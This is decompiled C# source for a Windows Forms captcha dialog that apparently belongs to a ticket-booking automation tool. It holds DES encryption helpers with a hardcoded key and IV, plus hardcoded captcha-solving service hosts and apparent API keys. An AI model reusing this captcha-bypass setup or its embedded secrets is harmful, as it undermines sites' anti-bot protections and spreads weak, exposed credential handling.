		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
		cryptoStream.Write(bytes2, 0, bytes2.Length);
		cryptoStream.FlushFinalBlock();
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public static string Decrypt(string string_0)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_4.Substring(0, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			byte[] array = Convert.FromBase64String(string_0);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			return Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	protected new virtual void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmCaptcha));
		this.lnkOTP = new System.Windows.Forms.LinkLabel();
		this.label1 = new System.Windows.Forms.Label();
		this.label2 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.label4 = new System.Windows.Forms.Label();
		this.txtImageData = new System.Windows.Forms.TextBox();
		this.lblWrongCaptcha = new System.Windows.Forms.Label();
		this.chkDark = new System.Windows.Forms.CheckBox();
		this.chkThin = new System.Windows.Forms.CheckBox();
		this.chkDarkLarge = new System.Windows.Forms.CheckBox();
		this.pnlCaptcha = new System.Windows.Forms.Panel();
		this.btnSubmit = new System.Windows.Forms.Button();
		this.picOriginal = new System.Windows.Forms.PictureBox();
		this.picDarkLarge = new System.Windows.Forms.PictureBox();
		this.picDark = new System.Windows.Forms.PictureBox();
		this.picThin = new System.Windows.Forms.PictureBox();
		this.lblTime = new System.Windows.Forms.Label();
		this.timer_1 = new System.Windows.Forms.Timer(this.components);
		this.bunifuElipse_0 = new Bunifu.Framework.UI.BunifuElipse(this.components);
		this.pnlHeader = new System.Windows.Forms.Panel();
		this.tktname = new System.Windows.Forms.Label();
		this.btnCancel = new Bunifu.Framework.UI.BunifuImageButton();
		this.btnReferesh = new Bunifu.Framework.UI.BunifuImageButton();
		this.pnlCaptcha.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.picOriginal).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picDarkLarge).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picDark).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picThin).BeginInit();
		this.pnlHeader.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.btnCancel).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.btnReferesh).BeginInit();
		base.SuspendLayout();
		this.lnkOTP.AutoSize = true;
		this.lnkOTP.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lnkOTP.LinkColor = System.Drawing.Color.FromArgb(128, 128, 255);
		this.lnkOTP.Location = new System.Drawing.Point(474, 39);
		this.lnkOTP.Name = "lnkOTP";
		this.lnkOTP.Size = new System.Drawing.Size(74, 14);
		this.lnkOTP.TabIndex = 19;
		this.lnkOTP.TabStop = true;
		this.lnkOTP.Text = "Resend OTP";
		this.lnkOTP.Visible = false;
		this.lnkOTP.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(lnkOTP_LinkClicked);
		this.label1.AutoSize = true;
		this.label1.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label1.Location = new System.Drawing.Point(391, 9);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(80, 14);
		this.label1.TabIndex = 1;
		this.label1.Text = "Original View";
		this.label2.AutoSize = true;
		this.label2.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label2.Location = new System.Drawing.Point(405, 40);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(62, 14);
		this.label2.TabIndex = 3;
		this.label2.Text = "Thin View";
		this.label3.AutoSize = true;
		this.label3.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label3.Location = new System.Drawing.Point(407, 108);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(63, 14);
		this.label3.TabIndex = 5;
		this.label3.Text = "Dark View";
		this.label4.AutoSize = true;
		this.label4.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label4.Location = new System.Drawing.Point(405, 180);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(98, 14);
		this.label4.TabIndex = 6;
		this.label4.Text = "Dark Large View";
		this.txtImageData.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtImageData.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.txtImageData.Location = new System.Drawing.Point(6, 62);
		this.txtImageData.Margin = new System.Windows.Forms.Padding(2);
		this.txtImageData.MaxLength = 20;
		this.txtImageData.Name = "txtImageData";
		this.txtImageData.Size = new System.Drawing.Size(110, 21);
		this.txtImageData.TabIndex = 9;
		this.txtImageData.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.lblWrongCaptcha.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold);
		this.lblWrongCaptcha.ForeColor = System.Drawing.Color.Black;
		this.lblWrongCaptcha.Location = new System.Drawing.Point(258, 55);
		this.lblWrongCaptcha.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.lblWrongCaptcha.Name = "lblWrongCaptcha";
		this.lblWrongCaptcha.Size = new System.Drawing.Size(160, 16);
		this.lblWrongCaptcha.TabIndex = 13;
		this.lblWrongCaptcha.Text = "Captcha, Enter Again";
		this.lblWrongCaptcha.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.chkDark.AutoSize = true;
		this.chkDark.BackColor = System.Drawing.Color.Red;
		this.chkDark.Checked = true;
		this.chkDark.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkDark.Location = new System.Drawing.Point(389, 108);
		this.chkDark.Name = "chkDark";
		this.chkDark.Size = new System.Drawing.Size(15, 14);
		this.chkDark.TabIndex = 14;
		this.chkDark.UseVisualStyleBackColor = false;
		this.chkDark.CheckedChanged += new System.EventHandler(chkDark_CheckedChanged);
		this.chkThin.AutoSize = true;
		this.chkThin.Checked = true;
		this.chkThin.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkThin.Location = new System.Drawing.Point(389, 39);
		this.chkThin.Name = "chkThin";
		this.chkThin.Size = new System.Drawing.Size(15, 14);
		this.chkThin.TabIndex = 15;
		this.chkThin.UseVisualStyleBackColor = true;
		this.chkThin.CheckedChanged += new System.EventHandler(chkThin_CheckedChanged);
		this.chkDarkLarge.AutoSize = true;
		this.chkDarkLarge.Location = new System.Drawing.Point(389, 181);
		this.chkDarkLarge.Name = "chkDarkLarge";
		this.chkDarkLarge.Size = new System.Drawing.Size(15, 14);
		this.chkDarkLarge.TabIndex = 16;
		this.chkDarkLarge.UseVisualStyleBackColor = true;
		this.chkDarkLarge.CheckedChanged += new System.EventHandler(chkDarkLarge_CheckedChanged);
		this.pnlCaptcha.BackColor = System.Drawing.Color.White;
		this.pnlCaptcha.Controls.Add(this.btnSubmit);
		this.pnlCaptcha.Controls.Add(this.txtImageData);
		this.pnlCaptcha.Controls.Add(this.picOriginal);
		this.pnlCaptcha.Controls.Add(this.chkDarkLarge);
		this.pnlCaptcha.Controls.Add(this.chkThin);
		this.pnlCaptcha.Controls.Add(this.chkDark);
		this.pnlCaptcha.Controls.Add(this.picDarkLarge);
		this.pnlCaptcha.Controls.Add(this.label4);
		this.pnlCaptcha.Controls.Add(this.label3);
		this.pnlCaptcha.Controls.Add(this.picDark);
		this.pnlCaptcha.Controls.Add(this.label2);
		this.pnlCaptcha.Controls.Add(this.picThin);
		this.pnlCaptcha.Controls.Add(this.label1);
		this.pnlCaptcha.Controls.Add(this.lnkOTP);
		this.pnlCaptcha.Location = new System.Drawing.Point(0, 19);
		this.pnlCaptcha.Margin = new System.Windows.Forms.Padding(2);
		this.pnlCaptcha.Name = "pnlCaptcha";
		this.pnlCaptcha.Size = new System.Drawing.Size(219, 89);
		this.pnlCaptcha.TabIndex = 1;
		this.btnSubmit.BackColor = System.Drawing.Color.Red;
		this.btnSubmit.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.btnSubmit.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.8f, System.Drawing.FontStyle.Bold);
		this.btnSubmit.ForeColor = System.Drawing.Color.Black;
		this.btnSubmit.Location = new System.Drawing.Point(136, 61);
		this.btnSubmit.Margin = new System.Windows.Forms.Padding(2);
		this.btnSubmit.Name = "btnSubmit";
		this.btnSubmit.Size = new System.Drawing.Size(81, 22);
		this.btnSubmit.TabIndex = 1195;
		this.btnSubmit.Text = "Submit";
		this.btnSubmit.UseVisualStyleBackColor = false;
		this.btnSubmit.Click += new System.EventHandler(btnSubmit_Click);
		this.picOriginal.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.picOriginal.Location = new System.Drawing.Point(2, -8);
		this.picOriginal.Margin = new System.Windows.Forms.Padding(2);
		this.picOriginal.Name = "picOriginal";
		this.picOriginal.Size = new System.Drawing.Size(215, 67);
		this.picOriginal.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picOriginal.TabIndex = 0;
		this.picOriginal.TabStop = false;
		this.picDarkLarge.BackColor = System.Drawing.Color.White;
		this.picDarkLarge.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picDarkLarge.Location = new System.Drawing.Point(386, 197);
		this.picDarkLarge.Name = "picDarkLarge";
		this.picDarkLarge.Size = new System.Drawing.Size(191, 74);
		this.picDarkLarge.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picDarkLarge.TabIndex = 7;
		this.picDarkLarge.TabStop = false;
		this.picDarkLarge.Visible = false;
		this.picDark.BackColor = System.Drawing.Color.White;
		this.picDark.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picDark.Location = new System.Drawing.Point(386, 124);
		this.picDark.Name = "picDark";
		this.picDark.Size = new System.Drawing.Size(129, 50);
		this.picDark.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picDark.TabIndex = 4;
		this.picDark.TabStop = false;
		this.picThin.BackColor = System.Drawing.Color.White;
		this.picThin.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picThin.Location = new System.Drawing.Point(386, 55);
		this.picThin.Name = "picThin";
		this.picThin.Size = new System.Drawing.Size(139, 50);
		this.picThin.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picThin.TabIndex = 2;
		this.picThin.TabStop = false;
		this.lblTime.AutoSize = true;
		this.lblTime.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.lblTime.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblTime.ForeColor = System.Drawing.Color.Red;
		this.lblTime.Location = new System.Drawing.Point(260, 84);
		this.lblTime.Margin = new System.Windows.Forms.Padding(0);
		this.lblTime.Name = "lblTime";
		this.lblTime.Size = new System.Drawing.Size(81, 22);
		this.lblTime.TabIndex = 1190;
		this.lblTime.Text = "00:00:00";
		this.lblTime.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.lblTime.Visible = false;
		this.timer_1.Interval = 500;
		this.timer_1.Tick += new System.EventHandler(timer_1_Tick);
		this.bunifuElipse_0.ElipseRadius = 5;
		this.bunifuElipse_0.TargetControl = this;
		this.pnlHeader.BackColor = System.Drawing.Color.MediumSlateBlue;
		this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.pnlHeader.Controls.Add(this.tktname);
		this.pnlHeader.Controls.Add(this.btnCancel);
		this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
		this.pnlHeader.Location = new System.Drawing.Point(0, 0);
		this.pnlHeader.Name = "pnlHeader";
		this.pnlHeader.Size = new System.Drawing.Size(221, 15);
		this.pnlHeader.TabIndex = 1189;
		this.tktname.AutoSize = true;
		this.tktname.BackColor = System.Drawing.Color.Transparent;
		this.tktname.ForeColor = System.Drawing.Color.Black;
		this.tktname.Location = new System.Drawing.Point(-1, 0);
		this.tktname.Name = "tktname";
		this.tktname.Size = new System.Drawing.Size(45, 13);
		this.tktname.TabIndex = 1189;
		this.tktname.Text = "tktname";
		this.btnCancel.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnCancel.BackColor = System.Drawing.Color.Transparent;
		this.btnCancel.Cursor = System.Windows.Forms.Cursors.Hand;
		this.btnCancel.Image = (System.Drawing.Image)resources.GetObject("btnCancel.Image");
		this.btnCancel.ImageActive = null;
		this.btnCancel.Location = new System.Drawing.Point(205, -1);
		this.btnCancel.Name = "btnCancel";
		this.btnCancel.Size = new System.Drawing.Size(15, 15);
		this.btnCancel.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.btnCancel.TabIndex = 1188;
		this.btnCancel.TabStop = false;
		this.btnCancel.Zoom = 10;
		this.btnCancel.Click += new System.EventHandler(btnCancel_Click);
		this.btnReferesh.BackColor = System.Drawing.Color.Yellow;
		this.btnReferesh.Cursor = System.Windows.Forms.Cursors.Hand;
		this.btnReferesh.ImageActive = null;
		this.btnReferesh.Location = new System.Drawing.Point(253, 126);
		this.btnReferesh.Name = "btnReferesh";
		this.btnReferesh.Size = new System.Drawing.Size(18, 23);
		this.btnReferesh.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.btnReferesh.TabIndex = 1189;
		this.btnReferesh.TabStop = false;
		this.btnReferesh.Zoom = 10;
		this.btnReferesh.Click += new System.EventHandler(btnReferesh_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
		this.BackColor = System.Drawing.SystemColors.Control;
		base.ClientSize = new System.Drawing.Size(221, 110);
		base.ControlBox = false;
		base.Controls.Add(this.pnlHeader);
		base.Controls.Add(this.lblTime);
		base.Controls.Add(this.pnlCaptcha);
		base.Controls.Add(this.btnReferesh);
		base.Controls.Add(this.lblWrongCaptcha);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "frmCaptcha";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Enter Image";
		base.TopMost = true;
		base.Shown += new System.EventHandler(frmCaptcha_Shown);
		this.pnlCaptcha.ResumeLayout(false);
		this.pnlCaptcha.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.picOriginal).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picDarkLarge).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picDark).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picThin).EndInit();
		this.pnlHeader.ResumeLayout(false);
		this.pnlHeader.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.btnCancel).EndInit();
		((System.ComponentModel.ISupportInitialize)this.btnReferesh).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	static frmCaptcha()
	{
		string text = "34y5bu6b";
		string_4 = text;
		string text2 = "ripcaptcha.com";
		string_8 = text2;
		string text3 = "5da76abb77a8a0d3f7636645936a4668";
		string_9 = text3;
		string_11 = "";
		string_12 = "";
		string text4 = "0";
		string_13 = text4;
		string text5 = "b864f1e3f4664dc7b864f1e3f4664dc7";
		string_14 = text5;
		bool_4 = false;
		int_5 = 180;
		intptr_1 = new IntPtr(-1);
		string text6 = "api.cheapcaptcha.com";
		string_15 = text6;
	}
}
